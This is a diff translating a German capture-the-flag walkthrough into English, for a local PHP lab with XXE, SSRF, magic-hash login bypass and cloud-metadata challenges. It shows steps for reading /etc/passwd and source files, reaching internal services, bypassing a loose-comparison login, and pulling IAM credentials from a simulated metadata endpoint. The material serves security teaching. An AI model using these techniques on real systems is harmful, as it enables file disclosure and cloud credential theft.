@@ -3,16 +3,17 @@
 
 ## Flag 1 – XXE (XML External Entity Injection)
 
-**Endpunkt:** `http://localhost:8000/xml-import.php`
+**Endpoint:** `http://localhost:8000/xml-import.php`
 
-**Idee:** Die Seite parst vom Nutzer eingereichten XML-Code. Der XML-Parser ist mit
-`LIBXML_NOENT | LIBXML_DTDLOAD` konfiguriert, was das Laden externer Entitäten erlaubt.
-Ein Angreifer kann im DTD eine Entität definieren, die auf eine lokale Datei zeigt —
-der Dateiinhalt wird dann im Output der Seite angezeigt.
+**Idea:** The page parses XML submitted by the user. The XML parser is
+configured with `LIBXML_NOENT | LIBXML_DTDLOAD`, which allows loading
+external entities. An attacker can define an entity in the DTD that points
+to a local file — the file content is then shown in the page output.
 
-### Schritt 1 – Bestätigung: externer Entity-Support vorhanden
+### Step 1 – Confirm external entity support
 
-Folgenden XML-Payload einreichen um zu prüfen ob der Parser externe Entitäten auflöst:
+Submit the following XML payload to check if the parser resolves external
+entities:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -24,11 +25,11 @@ Folgenden XML-Payload einreichen um zu prüfen ob der Parser externe Entitäten 
 </records>
 ```
 
-**Erwartetes Ergebnis:** Der Inhalt von `/etc/passwd` erscheint in der Value-Spalte.
-Der User `php` mit uid 1000 ist sichtbar — das bestätigt, dass der Parser serverseitige
-Dateien liest und deren Inhalt ausgibt.
+**Expected result:** The content of `/etc/passwd` shows up in the value
+column. The user `php` with uid 1000 is visible — this confirms that the
+parser reads server-side files and prints their content.
 
-### Schritt 2 – Flag lesen
+### Step 2 – Read the flag
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -40,13 +41,13 @@ Dateien liest und deren Inhalt ausgibt.
 </records>
 ```
 
-**Ergebnis:** **Flag 1** erscheint in der Value-Spalte: `FLAG_PLACEHOLDER_xxe`
+**Result:** **Flag 1** shows up in the value column: `FLAG_PLACEHOLDER_xxe`
 
-### Bonus – Source Code lesen (Vorbereitung für Flag 3)
+### Bonus – Read source code (preparation for Flag 3)
 
-XXE erlaubt auch das Lesen von PHP-Quelldateien. Das ist der Einstieg in die
-Exploit-Kette: Man liest `login.php` und entdeckt darin den gespeicherten Hash
-und den unsicheren `==`-Vergleich:
+XXE also allows reading PHP source files. This is the starting point for the
+full exploit chain: reading `login.php` reveals the stored hash and the
+insecure `==` comparison:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -56,20 +57,24 @@ und den unsicheren `==`-Vergleich:
   <record><name>src</name><value>&src;</value></record>
 </records>
 ```
--> Man kann hier den Inhalt der PHP-Datei als Base64-String auslesen, da die PHP-Datei selbst nicht direkt ausgegeben werden kann. Anschließend lässt sich der String im Terminal wieder decodieren.
+-> This lets you read the PHP file's content as a Base64 string, since the
+PHP file itself can't be output directly. You can then decode the string in
+a terminal.
 
 ```bash
-echo "HIER_DEN_BASE64_STRING" | base64 -decho "HIER_DEN_BASE64_STRING" | base64 -d
+echo "YOUR_BASE64_STRING_HERE" | base64 -d
 ```
 
-**Ergebnis:** Quellcode von `login.php` erscheint. Darin sichtbar:
+**Result:** The source code of `login.php` shows up. It contains:
 - `define('ADMIN_TOKEN_HASH', '0e462097431906509019562988736854')`
-- Vergleich mit `==` statt `===`
+- A comparison using `==` instead of `===`
 
-Das sind alle Informationen die für Flag 3 benötigt werden.
+That's all the information needed for Flag 3.
 
-### Bonus – XXE als SSRF-Vektor
-Beim Lesen von `login.php` über XXE fällt ein Hinweis auf was `http://secret-service/` enthält. Dieser interne Dienst lässt sich auch direkt über XXE erreichen. Das ist gleichzeitig der Einstieg für Flag 2. 
+### Bonus – XXE as an SSRF vector
+While reading `login.php` via XXE, you find a hint about what
+`http://secret-service/` contains. This internal service can also be
+reached directly through XXE. This is also the entry point for Flag 2.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -81,128 +86,131 @@ Beim Lesen von `login.php` über XXE fällt ein Hinweis auf was `http://secret-s
 </records>
 ```
 
-**Ergebnis:** `FLAG_PLACEHOLDER_ssrf` — dieselbe Flag wie bei Flag 2, aber über
-einen alternativen Angriffsweg (XXE statt SSRF via url-preview.php).
+**Result:** `FLAG_PLACEHOLDER_ssrf` — the same flag as Flag 2, but reached
+through a different attack path (XXE instead of SSRF via
+`url-preview.php`).
 
 ---
 
 ## Flag 2 – SSRF (Server-Side Request Forgery)
 
-**Endpunkt:** `http://localhost:8000/url-preview.php`
+**Endpoint:** `http://localhost:8000/url-preview.php`
 
-**Idee:** Die Seite fetcht eine vom Nutzer angegebene URL über `curl_exec()` und zeigt
-den Response-Body an. Es gibt keine Prüfung ob die URL auf interne Hosts zeigt. Der
-Container `secret-service` läuft im selben Docker-Netzwerk, hat aber keinen nach außen
-gemappten Port — er ist also direkt im Browser nicht erreichbar. Über `url-preview.php`
-kann der Angreifer den Web-Server als Proxy missbrauchen.
+**Idea:** The page fetches a URL chosen by the user via `curl_exec()` and
+shows the response body. There is no check on whether the URL points to an
+internal host. The `secret-service` container runs in the same Docker
+network but has no port mapped to the outside — so it can't be reached
+directly from the browser. Through `url-preview.php`, an attacker can use
+the web server as a proxy.
 
-### Schritt 1 – Fetch-Funktion bestätigen
+### Step 1 – Confirm the fetch function
 
-URL eingeben: `https://example.com` -> Der HTML-Inhalt von example.com erscheint.
-Bestätigt: Die Seite fetcht beliebige URLs.
+Enter the URL `https://example.com` -> The HTML content of example.com
+shows up. Confirmed: the page fetches arbitrary URLs.
 
-### Schritt 2 – Internen Dienst erreichen
+### Step 2 – Reach the internal service
 
-URL eingeben:
+Enter the URL:
 ```
 http://secret-service/
 ```
--> URL kann im Flag 1 oder im Flag 3 gefunden werden.
+-> The URL can be found in Flag 1 or Flag 3.
 
-**Ergebnis:** **Flag 2** erscheint im Preview: `FLAG_PLACEHOLDER_ssrf`
+**Result:** **Flag 2** shows up in the preview: `FLAG_PLACEHOLDER_ssrf`
 
 ---
 
 ## Flag 3 – PHP Type Juggling (Magic Hash)
 
-**Endpunkt:** `http://localhost:8000/login.php`
+**Endpoint:** `http://localhost:8000/login.php`
 
-**Idee:** Das Login-System speichert einen MD5-Hash des Admin-Tokens und vergleicht
-ihn beim Login mit `==` (losem Vergleich statt `===`). In PHP werden Strings die dem
-Muster `0e[0-9]+` entsprechen als wissenschaftliche Notation interpretiert und in
-den Float `0.0` umgewandelt. Zwei solcher Strings sind daher `==` gleich — egal wie
-unterschiedlich sie tatsächlich sind. Solche Werte heißen "Magic Hashes" und sind
-öffentlich dokumentiert.
+**Idea:** The login system stores an MD5 hash of the admin token and
+compares it on login using `==` (loose comparison instead of `===`). In
+PHP, strings matching the pattern `0e[0-9]+` are interpreted as scientific
+notation and converted to the float `0.0`. Two such strings are therefore
+equal under `==` — no matter how different they actually are. Values like
+this are called "magic hashes" and are publicly documented.
 
-Der gespeicherte Hash ist: `0e462097431906509019562988736854`
+The stored hash is: `0e462097431906509019562988736854`
 (= `md5("240610708")`)
 
-### Schritt 1 – Verhalten beobachten
+### Step 1 – Observe the behavior
 
-Beliebigen String eintippen (z.B. `test`) und absenden.
+Enter any string (e.g. `test`) and submit it.
 
-**Ergebnis:** Fehlermeldung zeigt den submitted Hash an, z.B.
+**Result:** An error message shows the submitted hash, e.g.
 `submitted hash: 098f6bcd4621d373cade4e832627b4f6`
 
-Das bestätigt: Das System berechnet `md5(input)` und vergleicht das Ergebnis.
+This confirms: the system calculates `md5(input)` and compares the result.
 
-### Schritt 2 – Magic Hash identifizieren
+### Step 2 – Identify a magic hash
 
-Der gespeicherte Hash `0e462097431906509019562988736854` beginnt mit `0e` gefolgt
-von nur Ziffern. (Das weiß man weil man den Quellcode von login.php vorher per XXE gelesen hat.)
-PHP interpretiert das als `0 × 10^462... = 0.0`.
+The stored hash `0e462097431906509019562988736854` starts with `0e`
+followed by only digits. (You know this because you already read the
+source code of `login.php` via XXE.) PHP interprets this as
+`0 × 10^462... = 0.0`.
 
-Gesucht ist ein Input dessen MD5-Hash ebenfalls mit `0e` beginnt und nur Ziffern
-enthält. Solche Werte sind öffentlich bekannt:
+We need an input whose MD5 hash also starts with `0e` and contains only
+digits. Such values are publicly known:
 
-Token: `240610708` 
-MD5-Hash: `0e462097431906509019562988736854` |
+Token: `240610708`
+MD5 hash: `0e462097431906509019562988736854`
 
+### Step 3 – Log in
 
-### Schritt 3 – Einloggen
+Enter the token `240610708` and submit it.
 
-Token `240610708` eingeben und absenden.
+PHP calculates: `md5("240610708") = 0e462097431906509019562988736854`
 
-PHP berechnet: `md5("240610708") = 0e462097431906509019562988736854`
+Comparison: `'0e462097431906509019562988736854' == '0e462097431906509019562988736854'` -> `true`
 
-Vergleich: `'0e462097431906509019562988736854' == '0e462097431906509019562988736854'` -> `true`
+**Result:** **Flag 3** shows up: `FLAG_PLACEHOLDER_type_juggling`
 
-**Ergebnis:** **Flag 3** erscheint: `FLAG_PLACEHOLDER_type_juggling`
-
-Nach dem Login erscheint außerdem ein Hint:
+After logging in, a hint also appears:
 *"An internal microservice is running at `http://secret-service/` — not reachable from outside."*
 
 ---
 
-## Flag 4 – SSRF auf simulierten Cloud-Metadata-Dienst
+## Flag 4 – SSRF on a simulated cloud metadata service
 
-**Endpunkt:** `http://localhost:8000/url-preview.php`
+**Endpoint:** `http://localhost:8000/url-preview.php`
 
-**Idee:** In echten Cloud-Umgebungen (AWS EC2) ist unter `http://169.254.169.254/`
-ein Metadata-Service erreichbar der temporäre IAM-Credentials enthält. Ein Angreifer
-der SSRF ausnutzen kann, erhält diese Credentials und bekommt damit potenziell vollen
-Zugriff auf den Cloud-Account (reales Beispiel: Capital One Hack 2019).
+**Idea:** In real cloud environments (AWS EC2), a metadata service is
+reachable at `http://169.254.169.254/` and contains temporary IAM
+credentials. An attacker who can exploit SSRF gets access to these
+credentials and can potentially gain full access to the cloud account
+(real-world example: the Capital One breach in 2019).
 
-In dieser Challenge simuliert der Container `metadata` diesen Dienst unter dem
-Hostnamen `metadata.internal`. Der Hinweis darauf findet sich:
-- im HTML-Kommentar der Startseite (`Rechtsklick -> Seitenquelltext anzeigen`)
+In this challenge, the `metadata` container simulates this service under
+the hostname `metadata.internal`. You can find a hint pointing to it:
+- in the HTML comment on the home page (right-click -> view page source)
 
-### Schritt 1 – Endpunkt erkunden
+### Step 1 – Explore the endpoint
 
 ```
 http://metadata.internal/
 ```
--> Gibt zurück: `1.0 / 2007-01-19 / latest` — identisch mit dem echten AWS IMDS.
+-> Returns: `1.0 / 2007-01-19 / latest` — identical to the real AWS IMDS.
 
-### Schritt 2 – Pfade navigieren
+### Step 2 – Navigate the paths
 
 ```
 http://metadata.internal/latest/meta-data/
 ```
--> Listet verfügbare Felder, darunter `iam/`.
+-> Lists available fields, including `iam/`.
 
 ```
 http://metadata.internal/latest/meta-data/iam/security-credentials/
 ```
--> Gibt den Rollennamen `datasync-role` zurück.
+-> Returns the role name `datasync-role`.
 
-### Schritt 3 – Credentials abrufen
+### Step 3 – Fetch the credentials
 
 ```
 http://metadata.internal/latest/meta-data/iam/security-credentials/datasync-role
 ```
 
--> Gibt JSON zurück:
+-> Returns JSON:
 ```json
 {
   "Code": "Success",
@@ -213,6 +221,7 @@ http://metadata.internal/latest/meta-data/iam/security-credentials/datasync-role
 }
 ```
 
-**Ergebnis:** **Flag 4** steckt im Feld `SecretAccessKey`: `FLAG_PLACEHOLDER_metadata`
+**Result:** **Flag 4** is in the `SecretAccessKey` field:
+`FLAG_PLACEHOLDER_metadata`
 
 ---
